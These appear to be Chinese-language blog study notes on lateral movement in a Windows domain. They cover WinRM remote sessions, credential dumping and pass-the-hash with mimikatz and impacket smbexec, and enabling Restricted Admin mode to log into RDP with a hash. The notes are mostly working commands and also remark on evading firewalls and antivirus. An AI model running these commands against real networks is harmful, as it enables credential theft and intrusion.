<h2 id="WinRM获取交互式会话"><a href="#WinRM获取交互式会话" class="headerlink" title="WinRM获取交互式会话"></a>WinRM获取交互式会话</h2><p>powershell的远程传输协议是基于WinRM的</p>
<p>Enter-PSSession的PowerShell Cmdlet可以启动和远程主机的会话</p>
<p>创建会话</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#远程用户名</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;administrator&quot;</span><br><br><span class="hljs-comment">#用户密码</span><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;ADMIN!@#45&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">#将用户名和密码整合，以便导入credential</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-comment">#创建会话</span><br><span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-Name</span> Test <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">5985</span><br><span class="hljs-comment">#-Name是创建会话的命名</span><br><span class="hljs-comment">#-ComputerName是目标主机，可以是ip，也可以是主机名字</span><br><span class="hljs-comment">#-Credential是整合的凭据</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194112653.png"  ><span class="image-caption">image-20230208194112653</span></p>
<p>查看存在的所有会话</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-PSSession</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194357863.png"  ><span class="image-caption">image-20230208194357863</span></p>
<p>选择会话</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">Enter</span>-PSSession -Name <span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194459781.png"  ><span class="image-caption">image-20230208194459781</span></p>
<p>这样就成功了</p>
<p>也可以使用Invoke-Command</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span><br><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;ADMIN!@#45&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-variable">$Sess</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-Name</span> Test1 <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">5985</span><br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Session</span> <span class="hljs-variable">$Sess</span> <span class="hljs-literal">-ScriptBlock</span> &#123;whoami&#125;<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208195219772.png"  ><span class="image-caption">image-20230208195219772</span></p>
<p>成功</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用WinRM进行横向移动，最出色的地方在于，服务是windows自己提供的，开启服务就不会被防火墙拦截</p>
<p>其次是所利用的工具组件，都是Windows自带的，不用做免杀，除非EDR拦截了winrs.exe</p>
<h1 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h1><p>在windows server 2000之后，在windows中密码都用hash值保存，想要获取明文密码是比较困难的</p>
<p>获取到hash值密码之后，想要得到明文，是比较困难的，因为hash算法是一个单向的算法，不可逆</p>
<p>但是</p>
<p>hash值也是可以暴力破解的</p>
<h2 id="哈希传递攻击的利用"><a href="#哈希传递攻击的利用" class="headerlink" title="哈希传递攻击的利用"></a>哈希传递攻击的利用</h2><p>主要是mimikatz和impacket工具包里面的工具</p>
<p>其次就是crackmapexec、powershell、evil-winrm、metasploit框架工具等等</p>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>需要具备本地管理员权限</p>
<p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gentilkiwi/mimi</span>katz<br></code></pre></td></tr></table></figure>

<p>首先需要将mimikatz上传到目标主机</p>
<p>然后执行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>得到本地主机的管理员账户hash值</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208211118148.png"  ><span class="image-caption">image-20230208211118148</span></p>
<p>再进行尝试进行传递，可能其他主机也是这个密码</p>
<p><strong>就是碰运气去试账号密码</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:sayms /ntlm:5b56663cfe976a8b6a841ff7c1abcee1&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>







<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>常用的几个是psexec.py、smbexec.py、wmiexec.py</p>
<p>当然如果跳板机有python环境就不错，如果没有，可以把python文件打包为exe文件，也是可以执行的</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">#打包<span class="hljs-keyword">python</span>文件为<span class="hljs-keyword">exe</span><br><br>pip install pyinstaller<br><br><span class="hljs-keyword">cd</span> impacket\examples<br><br>pyinstaller -F wmiexec.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>



<p>也可以通过内网代理技术，代理到kali</p>
<p>以smbexec.py为例，其他两个的用法大同小异</p>
<h4 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a>smbexec.py</h4><p>打包为exe文件</p>
<p>exe文件地址</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">impacket-<span class="hljs-literal">master</span>\examples\dist<br></code></pre></td></tr></table></figure>



<p>使用</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">smbexec</span>.exe -hashes :<span class="hljs-number">5</span>b56663cfe976a8b6a841ff7c1abcee1 sayms/administrator@<span class="hljs-number">192.168.8.1</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208214117812.png"  ><span class="image-caption">image-20230208214117812</span></p>
<p><strong><font color='red'>就算开启防火墙，也是可以进行使用的</font></strong></p>
<h2 id="哈希传递登陆远程桌面"><a href="#哈希传递登陆远程桌面" class="headerlink" title="哈希传递登陆远程桌面"></a>哈希传递登陆远程桌面</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>远程主机开启了“受限管理员模式”</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">windows</span> server <span class="hljs-number">2012</span><span class="hljs-built_in">r2</span>及其以上版本支持受限管理员模式<br>开启此模式，可以使用hash值进行远程登录，不需要明文密码<br><br>此模式在win8.<span class="hljs-number">1</span>和windows server <span class="hljs-number">2012</span><span class="hljs-built_in">r2</span>中默认开启<br></code></pre></td></tr></table></figure>



<p>使用的用户凭据处于管理员组</p>
<p>hash值</p>
<h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><p>开启受限管理员模式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查询是否开启，结果为0，表示启动</span><br>reg query <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin<br><br><span class="hljs-comment">#开启命令</span><br>reg add <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure>



<p>开启之后，使用mimikatz进行hash传递，然后执行“mstsc.exe /restrictedadmin”</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:sayms /ntlm:5b56663cfe976a8b6a841ff7c1abcee1&quot;</span> <span class="hljs-string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></code></pre></td></tr></table></figure>









<h1 id="远程执行漏洞"><a href="#远程执行漏洞" class="headerlink" title="远程执行漏洞"></a>远程执行漏洞</h1><p>一些远程执行漏洞，也可以用来横向</p>
<p>比如</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">永恒之蓝 ms17<span class="hljs-string">-010</span><br><br>cve<span class="hljs-string">-2019</span><span class="hljs-string">-0708</span><br><br>ms08<span class="hljs-string">-067</span><br></code></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>域横向</tag>
      </tags>
  </entry>
</search>
